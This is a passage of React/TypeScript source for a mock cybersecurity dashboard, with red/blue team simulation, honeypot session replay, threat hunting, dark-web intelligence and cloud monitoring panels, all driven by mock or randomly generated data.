                </li>
              </ul>
            </div>

            <div className="cyber-card p-6 border-blue-500/30">
              <div className="flex items-center space-x-3 mb-4">
                <div className="w-10 h-10 rounded-lg bg-blue-500/20 flex items-center justify-center">
                  <Shield className="w-5 h-5 text-blue-500" />
                </div>
                <div>
                  <h4 className="text-white font-medium">Blue Team</h4>
                  <p className="text-sm text-cyber-muted">Detect & Defend</p>
                </div>
              </div>
              <ul className="space-y-2 text-sm text-cyber-muted">
                <li className="flex items-center space-x-2">
                  <ChevronRight className="w-4 h-4 text-blue-500" />
                  <span>Monitor for anomalies</span>
                </li>
                <li className="flex items-center space-x-2">
                  <ChevronRight className="w-4 h-4 text-blue-500" />
                  <span>Detect attacks</span>
                </li>
                <li className="flex items-center space-x-2">
                  <ChevronRight className="w-4 h-4 text-blue-500" />
                  <span>Apply mitigations</span>
                </li>
              </ul>
            </div>
          </div>
        </>
      ) : (
        <>
          {/* Simulation Dashboard */}
          <div className="cyber-card p-6">
            <div className="flex items-center justify-between mb-6">
              <div>
                <h3 className="text-lg font-semibold text-white">{activeScenario?.name}</h3>
                <p className="text-sm text-cyber-muted">
                  Started: {simulation.startTime?.toLocaleTimeString()}
                </p>
              </div>
              <div className="flex items-center space-x-4">
                <div className="flex items-center space-x-2">
                  <button
                    onClick={() => setViewMode('red')}
                    className={`px-4 py-2 rounded-lg flex items-center space-x-2 transition-colors ${
                      viewMode === 'red' ? 'bg-red-500/20 text-red-500' : 'text-cyber-muted'
                    }`}
                  >
                    <Sword className="w-4 h-4" />
                    <span>Red Team</span>
                  </button>
                  <button
                    onClick={() => setViewMode('blue')}
                    className={`px-4 py-2 rounded-lg flex items-center space-x-2 transition-colors ${
                      viewMode === 'blue' ? 'bg-blue-500/20 text-blue-500' : 'text-cyber-muted'
                    }`}
                  >
                    <Shield className="w-4 h-4" />
                    <span>Blue Team</span>
                  </button>
                </div>
                {simulation.status === 'running' && (
                  <button 
                    onClick={stopSimulation}
                    className="p-2 bg-red-500/20 text-red-500 rounded-lg hover:bg-red-500/30"
                  >
                    <StopCircle className="w-5 h-5" />
                  </button>
                )}
              </div>
            </div>

            {/* Score Board */}
            <div className="grid grid-cols-2 gap-6 mb-6">
              <div className="p-6 bg-red-500/10 border border-red-500/30 rounded-lg text-center">
                <div className="text-4xl font-bold text-red-500">{simulation.redTeamScore}</div>
                <div className="text-sm text-cyber-muted mt-1">Red Team Score</div>
              </div>
              <div className="p-6 bg-blue-500/10 border border-blue-500/30 rounded-lg text-center">
                <div className="text-4xl font-bold text-blue-500">{simulation.blueTeamScore}</div>
                <div className="text-sm text-cyber-muted mt-1">Blue Team Score</div>
              </div>
            </div>

            {/* Winner Banner */}
            {simulation.status === 'completed' && (
              <div className={`p-4 rounded-lg text-center mb-6 ${
                simulation.blueTeamScore > simulation.redTeamScore 
                  ? 'bg-blue-500/20 border border-blue-500/30' 
                  : 'bg-red-500/20 border border-red-500/30'
              }`}>
                <h4 className={`text-2xl font-bold ${
                  simulation.blueTeamScore > simulation.redTeamScore ? 'text-blue-500' : 'text-red-500'
                }`}>
                  {simulation.blueTeamScore > simulation.redTeamScore ? '🛡️ BLUE TEAM WINS!' : '⚔️ RED TEAM WINS!'}
                </h4>
                <p className="text-cyber-muted mt-2">
                  Final Score - Red: {simulation.redTeamScore} | Blue: {simulation.blueTeamScore}
                </p>
              </div>
            )}

            {/* Event Timeline */}
            <div className="space-y-3 max-h-96 overflow-y-auto">
              <h4 className="text-white font-medium">Event Timeline</h4>
              {simulation.events.length === 0 ? (
                <div className="text-center py-8 text-cyber-muted">
                  <Activity className="w-12 h-12 mx-auto mb-4 opacity-50" />
                  <p>Simulation starting...</p>
                </div>
              ) : (
                simulation.events.map((event, idx) => (
                  <motion.div
                    key={idx}
                    initial={{ opacity: 0, x: event.team === 'red' ? -20 : 20 }}
                    animate={{ opacity: 1, x: 0 }}
                    className={`flex items-start space-x-3 p-4 rounded-lg ${
                      event.team === 'red' 
                        ? 'bg-red-500/10 border-l-4 border-red-500' 
                        : 'bg-blue-500/10 border-l-4 border-blue-500'
                    }`}
                  >
                    <div className={`w-8 h-8 rounded-full flex items-center justify-center ${
                      event.team === 'red' ? 'bg-red-500/20' : 'bg-blue-500/20'
                    }`}>
                      {event.team === 'red' ? (
                        <Sword className="w-4 h-4 text-red-500" />
                      ) : (
                        <Shield className="w-4 h-4 text-blue-500" />
                      )}
                    </div>
                    <div className="flex-1">
                      <div className="flex items-center justify-between">
                        <span className={`font-medium ${
                          event.team === 'red' ? 'text-red-500' : 'text-blue-500'
                        }`}>
                          {event.team === 'red' ? 'RED TEAM' : 'BLUE TEAM'}
                        </span>
                        <span className="text-cyber-lime font-bold">+{event.points} pts</span>
                      </div>
                      <p className="text-white mt-1">{event.description}</p>
                      {event.technique && (
                        <span className="text-xs text-cyber-muted mt-1 inline-block">
                          {event.technique}
                        </span>
                      )}
                    </div>
                  </motion.div>
                ))
              )}
            </div>
          </div>

          {/* MITRE ATT&CK Mapping */}
          {activeScenario && (
            <div className="cyber-card p-6">
              <h4 className="text-white font-medium mb-4">MITRE ATT&CK Mapping</h4>
              <div className="space-y-3">
                {activeScenario.tactics.map((tactic, idx) => (
                  <div key={idx} className="p-4 bg-cyber-dark rounded-lg">
                    <div className="flex items-center justify-between mb-2">
                      <span className="text-cyber-lime font-mono text-sm">{tactic.technique}</span>
                      <span className="text-xs text-cyber-muted">{tactic.tactic}</span>
                    </div>
                    <p className="text-white text-sm mb-2">{tactic.procedure}</p>
                    <div className="grid grid-cols-2 gap-4 text-sm">
                      <div className="p-2 bg-blue-500/10 rounded">
                        <span className="text-blue-500">Detection: </span>
                        <span className="text-cyber-muted">{tactic.detection}</span>
                      </div>
                      <div className="p-2 bg-green-500/10 rounded">
                        <span className="text-green-500">Mitigation: </span>
                        <span className="text-cyber-muted">{tactic.mitigation}</span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </>
      )}
    </div>
  );
};

// ==================== COMPONENT: HONEYPOT INTEGRATION ====================

const HoneypotModule = () => {
  const [honeypots, setHoneypots] = useState<Honeypot[]>(mockHoneypots);
  const [selectedHoneypot, setSelectedHoneypot] = useState<Honeypot | null>(null);
  const [selectedInteraction, setSelectedInteraction] = useState<HoneypotInteraction | null>(null);

  const toggleHoneypot = (id: string) => {
    setHoneypots(honeypots.map(h => 
      h.id === id ? { ...h, status: h.status === 'active' ? 'inactive' : 'active' } : h
    ));
  };

  return (
    <div className="space-y-6">
      {/* Stats */}
      <div className="grid grid-cols-4 gap-4">
        <div className="cyber-card p-4 text-center">
          <div className="text-3xl font-bold text-cyber-lime">
            {honeypots.reduce((acc, h) => acc + h.stats.totalInteractions, 0)}
          </div>
          <div className="text-sm text-cyber-muted">Total Interactions</div>
        </div>
        <div className="cyber-card p-4 text-center">
          <div className="text-3xl font-bold text-orange-500">
            {honeypots.reduce((acc, h) => acc + h.stats.uniqueAttackers, 0)}
          </div>
          <div className="text-sm text-cyber-muted">Unique Attackers</div>
        </div>
        <div className="cyber-card p-4 text-center">
          <div className="text-3xl font-bold text-red-500">
            {honeypots.reduce((acc, h) => acc + h.stats.commandsCaptured, 0)}
          </div>
          <div className="text-sm text-cyber-muted">Commands Captured</div>
        </div>
        <div className="cyber-card p-4 text-center">
          <div className="text-3xl font-bold text-cyber-lime">
            {honeypots.filter(h => h.status === 'active').length}
          </div>
          <div className="text-sm text-cyber-muted">Active Honeypots</div>
        </div>
      </div>

      {/* Honeypots Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        {honeypots.map((honeypot) => (
          <div key={honeypot.id} className="cyber-card">
            <div className="p-4 border-b border-cyber-light">
              <div className="flex items-center justify-between">
                <div className="flex items-center space-x-3">
                  <div className={`w-10 h-10 rounded-lg flex items-center justify-center ${
                    honeypot.status === 'active' ? 'bg-green-500/20' : 'bg-cyber-gray'
                  }`}>
                    {honeypot.type === 'ssh' && <Terminal className="w-5 h-5 text-cyber-lime" />}
                    {honeypot.type === 'http' && <Globe className="w-5 h-5 text-cyber-lime" />}
                    {honeypot.type === 'ftp' && <FileText className="w-5 h-5 text-cyber-lime" />}
                    {honeypot.type === 'rdp' && <Monitor className="w-5 h-5 text-cyber-lime" />}
                    {honeypot.type === 'database' && <Database className="w-5 h-5 text-cyber-lime" />}
                  </div>
                  <div>
                    <h4 className="text-white font-medium">{honeypot.name}</h4>
                    <p className="text-sm text-cyber-muted">Port {honeypot.port}</p>
                  </div>
                </div>
                <button
                  onClick={() => toggleHoneypot(honeypot.id)}
                  className={`w-12 h-6 rounded-full transition-colors ${
                    honeypot.status === 'active' ? 'bg-green-500' : 'bg-cyber-gray border border-cyber-light'
                  }`}
                >
                  <div className={`w-5 h-5 rounded-full bg-white transition-transform ${
                    honeypot.status === 'active' ? 'translate-x-6' : 'translate-x-0.5'
                  }`} />
                </button>
              </div>
            </div>
            <div className="p-4">
              <div className="grid grid-cols-2 gap-4 mb-4">
                <div className="text-center p-3 bg-cyber-dark rounded">
                  <div className="text-xl font-bold text-white">{honeypot.stats.totalInteractions}</div>
                  <div className="text-xs text-cyber-muted">Interactions</div>
                </div>
                <div className="text-center p-3 bg-cyber-dark rounded">
                  <div className="text-xl font-bold text-white">{honeypot.stats.uniqueAttackers}</div>
                  <div className="text-xs text-cyber-muted">Attackers</div>
                </div>
              </div>
              <button 
                onClick={() => setSelectedHoneypot(honeypot)}
                className="w-full cyber-button-outline text-sm"
              >
                View Sessions
              </button>
            </div>
          </div>
        ))}
      </div>

      {/* Honeypot Sessions Modal */}
      {selectedHoneypot && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className="w-full max-w-4xl max-h-[90vh] bg-cyber-dark border border-cyber-light rounded-xl overflow-hidden"
          >
            <div className="flex items-center justify-between p-4 border-b border-cyber-light">
              <div>
                <h2 className="text-xl font-bold text-white">{selectedHoneypot.name} Sessions</h2>
                <p className="text-sm text-cyber-muted">{selectedHoneypot.stats.totalInteractions} total interactions</p>
              </div>
              <button onClick={() => setSelectedHoneypot(null)} className="p-2 text-cyber-muted hover:text-white">
                <X className="w-5 h-5" />
              </button>
            </div>
            <div className="p-6 overflow-y-auto max-h-[calc(90vh-80px)]">
              <div className="space-y-4">
                {selectedHoneypot.interactions.map((interaction) => (
                  <div 
                    key={interaction.id} 
                    onClick={() => setSelectedInteraction(interaction)}
                    className="p-4 bg-cyber-gray rounded-lg cursor-pointer hover:bg-cyber-light transition-colors"
                  >
                    <div className="flex items-center justify-between mb-2">
                      <div className="flex items-center space-x-3">
                        <MapPin className="w-4 h-4 text-cyber-lime" />
                        <span className="text-white font-mono">{interaction.attackerIp}</span>
                        {interaction.attackerGeo && (
                          <span className="text-sm text-cyber-muted">
                            {interaction.attackerGeo.city}, {interaction.attackerGeo.country}
                          </span>
                        )}
                      </div>
                      <span className="text-sm text-cyber-muted">
                        {interaction.sessionDuration}s session
                      </span>
                    </div>
                    <div className="flex items-center space-x-4 text-sm">
                      <span className="text-cyber-muted">
                        {interaction.commands.length} commands
                      </span>
                      <span className="text-cyber-muted">
                        {interaction.credentialsAttempted.length} credential attempts
                      </span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </motion.div>
        </div>
      )}

      {/* Interaction Detail Modal */}
      {selectedInteraction && (
        <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/90 backdrop-blur-sm p-4">
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className="w-full max-w-3xl max-h-[90vh] bg-cyber-dark border border-cyber-light rounded-xl overflow-hidden"
          >
            <div className="flex items-center justify-between p-4 border-b border-cyber-light">
              <div>
                <h2 className="text-xl font-bold text-white">Session Replay</h2>
                <p className="text-sm text-cyber-muted font-mono">{selectedInteraction.attackerIp}</p>
              </div>
              <button onClick={() => setSelectedInteraction(null)} className="p-2 text-cyber-muted hover:text-white">
                <X className="w-5 h-5" />
              </button>
            </div>
            <div className="p-6 overflow-y-auto max-h-[calc(90vh-80px)]">
              {/* Terminal Replay */}
              <div className="bg-black rounded-lg p-4 font-mono text-sm mb-6">
                <div className="flex items-center space-x-2 mb-4 text-cyber-muted">
                  <Terminal className="w-4 h-4" />
                  <span>honeypot-session-{selectedInteraction.id}.log</span>
                </div>
                <div className="space-y-2">
                  <div className="text-green-500">Connection from {selectedInteraction.attackerIp}</div>
                  {selectedInteraction.commands.map((cmd, idx) => (
                    <div key={idx}>
                      <span className="text-cyber-lime">root@honeypot:~# </span>
                      <span className="text-white">{cmd}</span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Credentials Attempted */}
              {selectedInteraction.credentialsAttempted.length > 0 && (
                <div className="mb-6">
                  <h4 className="text-white font-medium mb-2">Credentials Attempted</h4>
                  <div className="flex flex-wrap gap-2">
                    {selectedInteraction.credentialsAttempted.map((cred, idx) => (
                      <span key={idx} className="px-3 py-1 bg-red-500/20 text-red-500 rounded text-sm font-mono">
                        {cred}
                      </span>
                    ))}
                  </div>
                </div>
              )}

              {/* Files Accessed */}
              {selectedInteraction.filesAccessed.length > 0 && (
                <div>
                  <h4 className="text-white font-medium mb-2">Files Accessed</h4>
                  <div className="space-y-1">
                    {selectedInteraction.filesAccessed.map((file, idx) => (
                      <div key={idx} className="flex items-center space-x-2 text-sm">
                        <FileText className="w-4 h-4 text-cyber-lime" />
                        <span className="text-white font-mono">{file}</span>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          </motion.div>
        </div>
      )}
    </div>
  );
};

// Monitor icon component
const Monitor = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <rect x="2" y="3" width="20" height="14" rx="2" ry="2"/>
    <line x1="8" y1="21" x2="16" y2="21"/>
    <line x1="12" y1="17" x2="12" y2="21"/>
  </svg>
);

// ==================== COMPONENT: THREAT HUNTING INTERFACE ====================

const ThreatHuntingModule = () => {
  const [queries, setQueries] = useState<HuntingQuery[]>(mockHuntingQueries);
  const [currentQuery, setCurrentQuery] = useState('');
  const [isSearching, setIsSearching] = useState(false);
  const [searchResults, setSearchResults] = useState<any[] | null>(null);
  const [showSaveModal, setShowSaveModal] = useState(false);
  const [queryName, setQueryName] = useState('');
  const [queryDescription, setQueryDescription] = useState('');

  const executeQuery = async () => {
    if (!currentQuery.trim()) return;
    
    setIsSearching(true);
    setSearchResults(null);

    // Simulate search
    await new Promise(r => setTimeout(r, 2000));

    // Generate mock results based on query
    const mockResults = Array(Math.floor(Math.random() * 10) + 1).fill(0).map((_, i) => ({
      id: `event-${Date.now()}-${i}`,
      timestamp: new Date(Date.now() - Math.random() * 86400000 * 7),
      source_ip: `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
      destination_ip: `10.0.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
      event_type: ['failed_login', 'file_access', 'process_create', 'network_connect'][Math.floor(Math.random() * 4)],
      severity: ['low', 'medium', 'high', 'critical'][Math.floor(Math.random() * 4)],
      user: ['admin', 'john.doe', 'system', 'guest'][Math.floor(Math.random() * 4)],
      description: `Suspicious ${['network activity', 'file modification', 'authentication attempt', 'process execution'][Math.floor(Math.random() * 4)]} detected`
    }));

    setSearchResults(mockResults);
    setIsSearching(false);
  };

  const saveQuery = () => {
    const newQuery: HuntingQuery = {
      id: Date.now().toString(),
      name: queryName,
      description: queryDescription,
      query: currentQuery,
      createdBy: 'Current User',
      createdAt: new Date(),
      lastRun: new Date(),
      resultCount: searchResults?.length,
      isFavorite: false
    };
    setQueries([...queries, newQuery]);
    setShowSaveModal(false);
    setQueryName('');
    setQueryDescription('');
  };

  const loadQuery = (query: HuntingQuery) => {
    setCurrentQuery(query.query);
  };

  const toggleFavorite = (id: string) => {
    setQueries(queries.map(q => q.id === id ? { ...q, isFavorite: !q.isFavorite } : q));
  };

  const deleteQuery = (id: string) => {
    setQueries(queries.filter(q => q.id !== id));
  };

  return (
    <div className="space-y-6">
      {/* Query Editor */}
      <div className="cyber-card p-6">
        <h3 className="text-lg font-semibold text-white mb-4 flex items-center space-x-2">
          <Search className="w-5 h-5 text-cyber-lime" />
          <span>Hunt Query</span>
        </h3>
        <div className="space-y-4">
          <div className="relative">
            <textarea
              value={currentQuery}
              onChange={(e) => setCurrentQuery(e.target.value)}
              placeholder="Enter your hunting query... (e.g., source_ip:192.168.1.1 AND event_type:failed_login)"
              className="cyber-input w-full h-32 resize-none font-mono text-sm"
            />
            <div className="absolute bottom-3 right-3 flex items-center space-x-2">
              <button 
                onClick={() => setCurrentQuery('')}
                className="p-2 text-cyber-muted hover:text-white"
              >
                <Trash2 className="w-4 h-4" />
              </button>
            </div>
          </div>
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-2 text-sm text-cyber-muted">
              <Info className="w-4 h-4" />
              <span>Use AND, OR, NOT operators. Field names: source_ip, user, event_type, timestamp</span>
            </div>
            <div className="flex items-center space-x-2">
              <button 
                onClick={() => setShowSaveModal(true)}
                disabled={!currentQuery.trim() || !searchResults}
                className="cyber-button-outline text-sm disabled:opacity-50"
              >
                <Save className="w-4 h-4 mr-1" />
                Save Query
              </button>
              <button 
                onClick={executeQuery}
                disabled={isSearching || !currentQuery.trim()}
                className="cyber-button text-sm"
              >
                {isSearching ? (
                  <>
                    <RefreshCw className="w-4 h-4 mr-1 animate-spin" />
                    Hunting...
                  </>
                ) : (
                  <>
                    <Search className="w-4 h-4 mr-1" />
                    Hunt
                  </>
                )}
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Search Results */}
      {searchResults && (
        <div className="cyber-card">
          <div className="p-4 border-b border-cyber-light flex items-center justify-between">
            <h3 className="text-lg font-semibold text-white">
              Results ({searchResults.length} events found)
            </h3>
            <div className="flex items-center space-x-2">
              <button className="p-2 text-cyber-muted hover:text-cyber-lime">
                <Download className="w-4 h-4" />
              </button>
            </div>
          </div>
          <div className="p-4">
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead>
                  <tr className="text-left text-xs font-mono text-cyber-muted border-b border-cyber-light">
                    <th className="pb-3 pl-4">TIMESTAMP</th>
                    <th className="pb-3">SOURCE</th>
                    <th className="pb-3">DESTINATION</th>
                    <th className="pb-3">EVENT TYPE</th>
                    <th className="pb-3">USER</th>
                    <th className="pb-3">SEVERITY</th>
                    <th className="pb-3">DESCRIPTION</th>
                  </tr>
                </thead>
                <tbody>
                  {searchResults.map((result) => (
                    <tr key={result.id} className="border-b border-cyber-light/50 hover:bg-cyber-gray/50">
                      <td className="py-3 pl-4 text-sm font-mono text-cyber-muted">
                        {result.timestamp.toLocaleString()}
                      </td>
                      <td className="py-3 text-sm font-mono text-white">{result.source_ip}</td>
                      <td className="py-3 text-sm font-mono text-cyber-muted">{result.destination_ip}</td>
                      <td className="py-3 text-sm text-cyber-lime">{result.event_type}</td>
                      <td className="py-3 text-sm text-white">{result.user}</td>
                      <td className="py-3">
                        <span className={`text-xs px-2 py-1 rounded ${
                          result.severity === 'critical' ? 'bg-red-500/20 text-red-500' :
                          result.severity === 'high' ? 'bg-orange-500/20 text-orange-500' :
                          result.severity === 'medium' ? 'bg-yellow-500/20 text-yellow-500' :
                          'bg-green-500/20 text-green-500'
                        }`}>
                          {result.severity}
                        </span>
                      </td>
                      <td className="py-3 text-sm text-cyber-muted">{result.description}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      )}

      {/* Saved Queries */}
      <div className="cyber-card">
        <div className="p-4 border-b border-cyber-light">
          <h3 className="text-lg font-semibold text-white">Saved Queries</h3>
        </div>
        <div className="p-4">
          <div className="space-y-3">
            {queries.map((query) => (
              <div key={query.id} className="p-4 bg-cyber-dark rounded-lg border border-cyber-light hover:border-cyber-lime transition-colors">
                <div className="flex items-start justify-between mb-2">
                  <div>
                    <h4 className="text-white font-medium">{query.name}</h4>
                    <p className="text-sm text-cyber-muted">{query.description}</p>
                  </div>
                  <div className="flex items-center space-x-1">
                    <button 
                      onClick={() => toggleFavorite(query.id)}
                      className={`p-1 ${query.isFavorite ? 'text-cyber-lime' : 'text-cyber-muted'}`}
                    >
                      <Sparkles className="w-4 h-4" />
                    </button>
                    <button 
                      onClick={() => deleteQuery(query.id)}
                      className="p-1 text-cyber-muted hover:text-red-500"
                    >
                      <Trash2 className="w-4 h-4" />
                    </button>
                  </div>
                </div>
                <code className="block p-2 bg-cyber-black rounded text-sm text-cyber-lime font-mono mb-3">
                  {query.query}
                </code>
                <div className="flex items-center justify-between text-sm">
                  <span className="text-cyber-muted">
                    By {query.createdBy} • {query.lastRun?.toLocaleDateString()}
                  </span>
                  <button 
                    onClick={() => loadQuery(query)}
                    className="text-cyber-lime hover:underline"
                  >
                    Load Query
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Save Query Modal */}
      {showSaveModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="w-full max-w-md bg-cyber-dark border border-cyber-light rounded-xl overflow-hidden"
          >
            <div className="flex items-center justify-between p-4 border-b border-cyber-light">
              <h2 className="text-xl font-bold text-white">Save Query</h2>
              <button onClick={() => setShowSaveModal(false)} className="p-2 text-cyber-muted hover:text-white">
                <X className="w-5 h-5" />
              </button>
            </div>
            <div className="p-6 space-y-4">
              <div>
                <label className="block text-sm text-cyber-muted mb-1">Query Name</label>
                <input
                  type="text"
                  value={queryName}
                  onChange={(e) => setQueryName(e.target.value)}
                  className="cyber-input w-full"
                  placeholder="e.g., Failed Login Spike"
                />
              </div>
              <div>
                <label className="block text-sm text-cyber-muted mb-1">Description</label>
                <textarea
                  value={queryDescription}
                  onChange={(e) => setQueryDescription(e.target.value)}
                  className="cyber-input w-full h-20 resize-none"
                  placeholder="What does this query detect?"
                />
              </div>
            </div>
            <div className="flex items-center justify-end space-x-3 p-4 border-t border-cyber-light">
              <button onClick={() => setShowSaveModal(false)} className="cyber-button-outline">Cancel</button>
              <button 
                onClick={saveQuery}
                disabled={!queryName.trim()}
                className="cyber-button disabled:opacity-50"
              >
                Save
              </button>
            </div>
          </motion.div>
        </div>
      )}
    </div>
  );
};

// ==================== COMPONENT: DARK WEB & THREAT INTELLIGENCE ====================

const DarkWebIntelligenceModule = () => {
  const [findings] = useState<DarkWebFinding[]>(mockDarkWebFindings);
  const [searchTerm, setSearchTerm] = useState('');
  const [reputationResults, setReputationResults] = useState<ReputationResult[]>([]);
  const [isSearching, setIsSearching] = useState(false);

  const checkReputation = async () => {
    if (!searchTerm.trim()) return;
    
    setIsSearching(true);
    await new Promise(r => setTimeout(r, 1500));

    const mockResult: ReputationResult = {
      indicator: searchTerm,
      type: searchTerm.includes('.') ? 'domain' : searchTerm.includes(':') ? 'ip' : 'hash',
      reputation: Math.random() > 0.5 ? 'malicious' : Math.random() > 0.5 ? 'suspicious' : 'clean',
      score: Math.floor(Math.random() * 100),
      sources: [
        { name: 'VirusTotal', verdict: Math.random() > 0.5 ? 'Malicious' : 'Clean' },
        { name: 'AbuseIPDB', verdict: Math.random() > 0.5 ? 'Reported' : 'Clean' },
        { name: 'AlienVault', verdict: Math.random() > 0.5 ? 'Malicious' : 'Clean' }
      ],
      firstSeen: new Date(Date.now() - Math.random() * 86400000 * 365),
      lastSeen: new Date(Date.now() - Math.random() * 86400000 * 30),
      relatedThreats: ['TrickBot', 'Emotet', 'Cobalt Strike'].slice(0, Math.floor(Math.random() * 3) + 1)
    };

    setReputationResults([mockResult, ...reputationResults]);
    setIsSearching(false);
  };

  return (
    <div className="space-y-6">
      {/* Reputation Checker */}
      <div className="cyber-card p-6">
        <h3 className="text-lg font-semibold text-white mb-4 flex items-center space-x-2">
          <Search className="w-5 h-5 text-cyber-lime" />
          <span>Reputation Lookup</span>
        </h3>
        <div className="flex space-x-4">
          <input
            type="text"
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            placeholder="Enter IP, domain, or hash..."
            className="cyber-input flex-1 font-mono"
          />
          <button 
            onClick={checkReputation}
            disabled={isSearching || !searchTerm.trim()}
            className="cyber-button"
          >
            {isSearching ? <RefreshCw className="w-5 h-5 animate-spin" /> : <Search className="w-5 h-5" />}
          </button>
        </div>

        {/* Results */}
        {reputationResults.length > 0 && (
          <div className="mt-6 space-y-4">
            {reputationResults.map((result, idx) => (
              <div key={idx} className="p-4 bg-cyber-dark rounded-lg border border-cyber-light">
                <div className="flex items-center justify-between mb-3">
                  <code className="text-cyber-lime font-mono">{result.indicator}</code>
                  <span className={`px-3 py-1 rounded text-sm font-medium ${
                    result.reputation === 'malicious' ? 'bg-red-500/20 text-red-500' :
                    result.reputation === 'suspicious' ? 'bg-orange-500/20 text-orange-500' :
                    'bg-green-500/20 text-green-500'
                  }`}>
                    {result.reputation.toUpperCase()} ({result.score}/100)
                  </span>
                </div>
                <div className="grid grid-cols-3 gap-4 text-sm mb-3">
                  <div>
                    <span className="text-cyber-muted">First Seen:</span>
                    <span className="text-white ml-2">{result.firstSeen?.toLocaleDateString()}</span>
                  </div>
                  <div>
                    <span className="text-cyber-muted">Last Seen:</span>
                    <span className="text-white ml-2">{result.lastSeen?.toLocaleDateString()}</span>
                  </div>
                  <div>
                    <span className="text-cyber-muted">Type:</span>
                    <span className="text-white ml-2 uppercase">{result.type}</span>
                  </div>
                </div>
                <div className="flex flex-wrap gap-2">
                  {result.sources.map((source, sidx) => (
                    <span key={sidx} className="px-2 py-1 bg-cyber-gray rounded text-xs">
                      <span className="text-cyber-muted">{source.name}:</span>
                      <span className={`ml-1 ${source.verdict === 'Clean' ? 'text-green-500' : 'text-red-500'}`}>
                        {source.verdict}
                      </span>
                    </span>
                  ))}
                </div>
                {result.relatedThreats.length > 0 && (
                  <div className="mt-3 pt-3 border-t border-cyber-light">
                    <span className="text-sm text-cyber-muted">Related Threats:</span>
                    <div className="flex flex-wrap gap-2 mt-1">
                      {result.relatedThreats.map((threat, tidx) => (
                        <span key={tidx} className="px-2 py-1 bg-red-500/20 text-red-500 rounded text-xs">
                          {threat}
                        </span>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            ))}
          </div>
        )}
      </div>

      {/* Dark Web Findings */}
      <div className="cyber-card">
        <div className="p-4 border-b border-cyber-light">
          <h3 className="text-lg font-semibold text-white flex items-center space-x-2">
            <EyeOff className="w-5 h-5 text-cyber-lime" />
            <span>Dark Web Intelligence</span>
          </h3>
        </div>
        <div className="p-4">
          <div className="space-y-4">
            {findings.map((finding) => (
              <div key={finding.id} className="p-4 bg-cyber-dark rounded-lg border border-cyber-light">
                <div className="flex items-start justify-between mb-3">
                  <div>
                    <div className="flex items-center space-x-3 mb-1">
                      <h4 className="text-white font-medium">{finding.title}</h4>
                      <span className={`text-xs px-2 py-1 rounded ${
                        finding.severity === 'critical' ? 'bg-red-500/20 text-red-500' :
                        finding.severity === 'high' ? 'bg-orange-500/20 text-orange-500' :
                        finding.severity === 'medium' ? 'bg-yellow-500/20 text-yellow-500' :
                        'bg-green-500/20 text-green-500'
                      }`}>
                        {finding.severity.toUpperCase()}
                      </span>
                    </div>
                    <p className="text-sm text-cyber-muted">{finding.description}</p>
                  </div>
                  <div className="text-right">
                    <div className="text-sm text-cyber-lime">{finding.source}</div>
                    <div className="text-xs text-cyber-muted">{finding.discoveredAt.toLocaleDateString()}</div>
                  </div>
                </div>
                <div className="flex flex-wrap gap-2 mb-3">
                  {finding.iocs.map((ioc, idx) => (
                    <span key={idx} className="px-2 py-1 bg-cyber-lime/20 text-cyber-lime rounded text-xs font-mono">
                      {ioc}
                    </span>
                  ))}
                </div>
                {finding.price && (
                  <div className="flex items-center justify-between pt-3 border-t border-cyber-light">
                    <div className="text-sm">
                      <span className="text-cyber-muted">Seller: </span>
                      <span className="text-white">{finding.seller}</span>
                    </div>
                    <div className="text-lg font-bold text-red-500">{finding.price}</div>
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
};

// ==================== COMPONENT: CLOUD SECURITY MONITORING ====================

const CloudSecurityModule = () => {
  const [accounts] = useState<CloudAccount[]>(mockCloudAccounts);
  const [, setSelectedAccount] = useState<CloudAccount | null>(null);

  const getProviderIcon = (provider: string) => {
    switch (provider) {
      case 'aws': return <Cloud className="w-5 h-5 text-orange-500" />;
      case 'azure': return <Cloud className="w-5 h-5 text-blue-500" />;
      case 'gcp': return <Cloud className="w-5 h-5 text-green-500" />;
      default: return <Cloud className="w-5 h-5 text-cyber-muted" />;
    }
  };

  return (
    <div className="space-y-6">
      {/* Cloud Accounts */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        {accounts.map((account) => (
          <div 
            key={account.id} 
            onClick={() => setSelectedAccount(account)}
            className="cyber-card p-6 cursor-pointer hover:border-cyber-lime transition-colors"
          >
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center space-x-3">
                {getProviderIcon(account.provider)}
                <div>
                  <h4 className="text-white font-medium">{account.name}</h4>
                  <p className="text-sm text-cyber-muted font-mono">{account.accountId}</p>
                </div>
              </div>
              <div className={`w-2 h-2 rounded-full ${
                account.status === 'connected' ? 'bg-green-500' :
                account.status === 'error' ? 'bg-red-500' :
                'bg-cyber-muted'
              }`} />
            </div>
            <div className="grid grid-cols-2 gap-4">
              <div className="text-center p-3 bg-cyber-dark rounded">
